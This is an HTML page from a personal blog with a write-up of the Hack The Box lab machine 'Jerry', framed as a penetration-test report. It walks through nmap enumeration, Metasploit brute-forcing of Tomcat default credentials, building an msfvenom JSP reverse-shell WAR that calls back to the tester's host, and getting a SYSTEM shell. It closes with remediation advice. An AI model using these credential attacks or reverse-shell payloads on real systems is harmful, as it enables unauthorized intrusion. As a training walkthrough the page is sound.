@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+            </div>
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Jerry WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Jerry/Jerry_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <h1>1. Summary</h1>
+                    <p>This report documents the results of a security assessment performed on the target system identified with the IP address <strong>10.129.136.9</strong>. During the analysis, several critical vulnerabilities were identified, including outdated services, insecure configurations, and weak credentials. These vulnerabilities could allow an attacker to compromise the confidentiality and availability of the system.</p>
+                    <p>Key recommendations include:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>Update affected services.</li>
+                            <li>Configure strong passwords and robust authentication policies.</li>
+                            <li>Implement appropriate access controls and network segmentation.</li>
+                        </ul>
+                    </div>
+                    <p>This document details the identified vulnerabilities and provides concrete steps to address the observed risks.</p>
+                    <h1>2. Introduction</h1>
+                    <p>This report details the results of a security assessment performed on the system identified with the IP address <strong>10.129.136.9</strong>. The primary objective of the assessment is to identify whether there are vulnerabilities that may compromise the integrity, confidentiality or availability of the system, and to provide specific recommendations to mitigate the risks detected.</p>
+                    <p><Strong>Scope</Strong>:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li>Evaluation of services accessible from the provided IP address.</li>
+                            <li>Identifying insecure configurations, known vulnerabilities, and potential attack vectors.</li>
+                        </ul>
+                    </div>
+                    <h1>3. Methodology</h1>
+                    <p>Industry standard tools such as <strong>Nmap</strong>, <strong>Metasploit</strong>, and <strong>msfvenom</strong> were used to perform enumeration, exploitation, and post-exploitation on the target system. Analysis was conducted in compliance with security best practices and ethical standards to ensure that the operation did not interfere with the operating environment.</p>
+                    <h2>3.1 Limitations:</h2>
+                    <p>This analysis focuses solely on services accessible from the IP address. No testing involving denial of service, social engineering, or other methods that may affect system stability or data confidentiality has been performed.</p>
+                    <!-- -->
+                    <h1>4. Technical details</h1>
+                    <h2>4.1 Enumeration</h2>
+                    <p>We start with the initial scan. We will use the Nmap tool.</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn -p- 10.129.136.9                                          
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 03:54 EST
+Initiating SYN Stealth Scan at 03:54
+Scanning 10.129.136.9 [65535 ports]
+Discovered open port 8080/tcp on 10.129.136.9
+SYN Stealth Scan Timing: About 18.12% done; ETC: 03:57 (0:02:20 remaining)
+SYN Stealth Scan Timing: About 41.75% done; ETC: 03:56 (0:01:25 remaining)
+SYN Stealth Scan Timing: About 61.64% done; ETC: 03:56 (0:00:57 remaining)
+SYN Stealth Scan Timing: About 75.23% done; ETC: 03:56 (0:00:40 remaining)
+Completed SYN Stealth Scan at 03:56, 157.05s elapsed (65535 total ports)
+Nmap scan report for 10.129.136.9
+Host is up (0.039s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+8080/tcp open  http-proxy
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 157.11 seconds
+           Raw packets sent: 131186 (5.772MB) | Rcvd: 117 (5.148KB)
+                        </pre>
+                    </div>
+                    <p>From the previous scan, we discovered only one open port:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>8080/tcp</strong>: http-proxy</li>
+                        </ul>
+                    </div>
+
+                    <p>We proceed with service version enumeration and run NSE scripts to gather information about potential service vulnerabilities or configurations.</p>
+                    <div class="console-code">
+                        <pre>
+$ sudo nmap -v -n -Pn -sCV -p 8080 10.129.136.9  
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 03:57 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Initiating SYN Stealth Scan at 03:57
+Scanning 10.129.136.9 [1 port]
+Discovered open port 8080/tcp on 10.129.136.9
+Completed SYN Stealth Scan at 03:57, 0.05s elapsed (1 total ports)
+Initiating Service scan at 03:57
+Scanning 1 service on 10.129.136.9
+Completed Service scan at 03:57, 6.50s elapsed (1 service on 1 host)
+NSE: Script scanning 10.129.136.9.
+Initiating NSE at 03:57
+Completed NSE at 03:57, 5.05s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.31s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Nmap scan report for 10.129.136.9
+Host is up (0.038s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
+
+NSE: Script Post-scanning.
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Initiating NSE at 03:57
+Completed NSE at 03:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
+           Raw packets sent: 1 (44B) | Rcvd: 1 (44B)
+                        </pre>
+                    </div>
+                    <p><strong>Service discovery (Nmap -sCV)</strong></p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>HTTP</strong>: Apache Tomcat/7.0.88</li>
+                        </ul>
+                    </div>
+                    <h2>4.2 Exploitation</h2>
+                    <p>The result of the nmap scan shows that Apache tomcat is running on its default port. We use a web browser to confirm this.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Jerry/1.png" alt="">
+                        <p class="caption">Web service home page</p>
+                    </div>
+                    <p>We have an outdated Apache Tomcat that may be vulnerable.</p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Vulnerability</th>
+                                <th>Description</th>
+                                <th>Impact</th>
+                                <th>State</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Outdated software.</td>
+                                <td>The web server uses a vulnerable version that allows privilege escalation.</td>
+                                <td>Elevation of privilege.</td>
+                                <td>Exploited</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <p>We can try to log in to the login panel with default credentials. We will use metasploit to perform credential fuzzing.</p>
+                    <div class="console-code">
+                        <pre>
+$ msfconsole -q
+msf6 > use scanner/http/tomcat_mgr_login
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > options
+
+Module options (auxiliary/scanner/http/tomcat_mgr_login):
+
+   Name              Current Setting                                     Required  Description
+   ----              ---------------                                     --------  -----------
+   ANONYMOUS_LOGIN   false                                               yes       Attempt to login with a blank username and password
+   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                                                no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+   PASSWORD                                                              no        The HTTP password to specify for authentication
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tom  no        File containing passwords, one per line
+                     cat_mgr_default_pass.txt
+   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metas
+                                                                                   ploit.html
+   RPORT             8080                                                yes       The target port (TCP)
+   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   false                                               yes       Stop guessing when a credential works for a host
+   TARGETURI         /manager/html                                       yes       URI for Manager login. Default is /manager/html
+   THREADS           1                                                   yes       The number of concurrent threads (max one per host)
+   USERNAME                                                              no        The HTTP username to specify for authentication
+   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tom  no        File containing users and passwords separated by space, one pair per line
+                     cat_mgr_default_userpass.txt
+   USER_AS_PASS      false                                               no        Try the username as the password for all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tom  no        File containing users, one per line
+                     cat_mgr_default_users.txt
+   VERBOSE           true                                                yes       Whether to print output for all attempts
+   VHOST                                                                 no        HTTP server virtual host
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.136.9
+rhosts => 10.129.136.9
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > 
+                        </pre>
+                    </div>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Vulnerability</th>
+                                <th>Description</th>
+                                <th>Impact</th>
+                                <th>State</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Default credentials.</td>
+                                <td>Default username and password, not changed in the service.</td>
+                                <td>Unauthorized access to the system.</td>
+                                <td>Exploited</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    <p>Once the script is configured with the IP of the target machine, we execute the script.</p>
+                    <div class="console-code">
+                        <pre>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+
+[!] No active DB -- Credential data will not be saved!
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:admin (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:manager (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:role1 (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:root (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:tomcat (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: admin:s3cret (Incorrect)
+&lt;SNAP&gt;
+.
+.
+.
+&lt;SNAP&gt;
+[-] 10.129.136.9:8080 - LOGIN FAILED: root:ADMIN (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: root:xampp (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: tomcat:admin (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: tomcat:manager (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: tomcat:root (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)
+[+] 10.129.136.9:8080 - Login Successful: tomcat:s3cret
+[-] 10.129.136.9:8080 - LOGIN FAILED: both:admin (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: both:manager (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: both:role1 (Incorrect)
+[-] 10.129.136.9:8080 - LOGIN FAILED: both:root (Incorrect)
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/tomcat_mgr_login) >  
+                        </pre>
+                    </div>
+                    <p>It seems that the service is configured with default credentials. Now we tried to log in with the credentials found.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Jerry/2.png" alt="">
+                        <img src="../images/Posts/Jerry/3.png" alt="">
+                    </div>
+
+                    <p>At this point, we can try uploading a .war file with a reverse shell in it.</p>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Vulnerability</th>
+                                <th>Description</th>
+                                <th>Impact</th>
+                                <th>State</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Remote Code Execution.</td>
+                                <td>Vulnerability in the service that allows executing arbitrary commands.</td>
+                                <td>Full compromise of the target system.</td>
+                                <td>Exploited</td>
+                            </tr>
+                        </tbody>
+                    </table>
+
+                    <p>We will use msfvenom to create the malicious war file.</p>
+                    <div class="console-code">
+                        <pre>
+$ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=443 -f war > shell.war
+Payload size: 1100 bytes
+Final size of war file: 1100 bytes
+                        </pre>
+                    </div>
+                    <p>We upload the file by clicking on Browse, we search for the file and then click on deploy.</p>
+                    <div class="writeup-image">
+                        <img src="../images/Posts/Jerry/4.png" alt="">
+                        <img src="../images/Posts/Jerry/5.png" alt="">
+                    </div>
+                    <p>When we upload the file, we get an OK response and see our uploaded file at the bottom.</p>
+                    <p>Finally, we listen with netcat on port 443 and click /shell to execute the malicious file.</p>
+                    <div class="console-code">
+                        <pre>
+$ nc -nvlp 443                             
+listening on [any] 443 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.129.136.9] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88>whoami
+whoami
+nt authority\system
+
+C:\apache-tomcat-7.0.88>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::19c
+   IPv6 Address. . . . . . . . . . . : dead:beef::b026:f15e:35c4:d8f3
+   Link-local IPv6 Address . . . . . : fe80::b026:f15e:35c4:d8f3%12
+   IPv4 Address. . . . . . . . . . . : 10.129.136.9
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:7437%12
+                                       10.129.0.1
+
+Tunnel adapter isatap..htb:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : .htb
+
+C:\apache-tomcat-7.0.88>
+                        </pre>
+                    </div>
+                    <p>We get a shell as the highest privileged user thus compromising the entire system.</p>
+                    
+                    <h1>5. Recommendations</h1>
+                    <h3>Update Apache Tomcat to a recent version:</h3>
+                    <p>The installed version contains known vulnerabilities that can be exploited to compromise the system. Download and install the latest stable version of Apache Tomcat from its [official site](<a href="https://tomcat.apache.org/" target="_blank">https://tomcat.apache.org/</a>). Make sure to test in a development environment before deploying the update to production. The update removes known security flaws and strengthens protection against attacks.</p>
+                    <h3>Configure strong credentials and remove default users:</h3>
+                    <p>Weak or default credentials facilitate unauthorized access to the system. Configure strong passwords for all users, following best practices (minimum 12 characters, use of uppercase, lowercase letters, numbers, and special characters). Also, remove any default or unused accounts. Use password managers such as KeePass or Bitwarden to generate and store credentials.</p>
+                    <h3>Perform regular security audits:</h3>
+                    <p>Software configurations and updates can introduce new risks. Schedule bi-annual security audits using tools such as <strong>Nessus</strong>, <strong>OpenVAS</strong> or <strong>Burp Suite</strong>, and review logs regularly to identify suspicious activity to ensure your system remains protected from new threats.</p>
+                    <h1>6. Conclusion</h1>
+                    <p>The analysis carried out has revealed multiple weaknesses in the configuration of the target system. Among the most relevant findings are:</p>
+                    <div class="info-box">
+                        <ul>
+                            <li><strong>Outdated software</strong>: The presence of critical services, such as Apache Tomcat, in vulnerable versions exposes the system to known exploits.</li>
+                            <li><strong>Weak credentials</strong>: The use of default or weak passwords facilitates unauthorized access.</li>
+                            <li><strong>Lack of access controls</strong>: The exposure of critical ports without restrictions increases the risk of unauthorized external access.</li>
+                        </ul>
+                    </div>
+                    <p>These vulnerabilities, combined, allow full access to the system, which could be used as a starting point to compromise other devices on the internal network, significantly increasing the risk for the organization.</p>
+                    <p>To mitigate these risks, it is recommended to implement the measures described in the <strong>Recommendations</strong> section as a priority. In addition, it is essential to perform periodic audits and keep system configurations aligned with security best practices.</p>
+                </section>
+            </div>
+
+        </div>
+    </div>
+    
+    <!--Pet Cat-->
+    <div class="pet-container">
+        <img src="" alt="Walking Pet" id="pet" class="pet">
+    </div>
+    <script src="script.js"></script>
+    <!--Pet Cat-->
+</body>
+</html>
